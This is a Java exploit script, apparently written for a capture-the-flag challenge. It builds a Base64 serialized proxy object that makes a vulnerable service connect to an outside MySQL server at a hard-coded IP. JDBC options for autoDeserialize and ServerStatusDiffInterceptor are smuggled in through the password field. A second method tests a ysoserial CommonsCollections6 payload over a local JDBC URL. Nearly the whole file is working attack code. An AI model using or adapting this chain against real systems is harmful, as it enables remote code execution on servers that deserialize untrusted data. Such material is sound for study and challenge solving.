package gdufs.challenge.a_piece_of_java;

import gdufs.challenge.a_piece_of_java.invocation.InfoInvocationHandler;
import gdufs.challenge.a_piece_of_java.model.DatabaseInfo;
import gdufs.challenge.a_piece_of_java.model.Info;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.Base64;

/**
 * 功能：
 *
 * @author 长瀞同学
 * @ClassName test
 * @description
 * @date 2023-09-03 17:10
 * @Version 1.0
 */
public class test {

    public static void main(String[] args) throws Exception {
//        mysqlTest();
        payload();

    }
    public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void payload() throws Exception {
        Info databaseInfo = new DatabaseInfo();
        setFieldValue(databaseInfo, "host", "112.124.52.200");
        setFieldValue(databaseInfo, "port", "3307");
        setFieldValue(databaseInfo, "username", "fmyyy");
        setFieldValue(databaseInfo, "password", "fmyyy&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");
        Class clazz = Class.forName("gdufs.challenge.a_piece_of_java.invocation.InfoInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Info.class);
        construct.setAccessible(true);
//        System.out.println("123");a_piece_of_java
        InfoInvocationHandler handler = (InfoInvocationHandler) construct.newInstance(databaseInfo);
        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), new Class[] {Info.class}, handler);
        byte[] bytes = serialize(proxinfo);
        byte[] payload = Base64.getEncoder().encode(bytes);
        System.out.print(new String(payload));
//        Info info1 = (Info)deserialize(new String(payload));
//        info1.getAllInfo();
    }
    public static byte[] serialize(Object o) throws Exception{
        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
            ObjectOutputStream oout = new ObjectOutputStream(baout)){
            oout.writeObject(o);
            return baout.toByteArray();
        }
    }

    public static void mysqlTest() throws Exception {
        Class.forName("com.mysql.jdbc.Driver");
        //用户连接信息
        String url = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_CommonsCollections6_calc";
        //连接数据库
        Connection connection = DriverManager.getConnection(url);
        connection.close();
    }


}
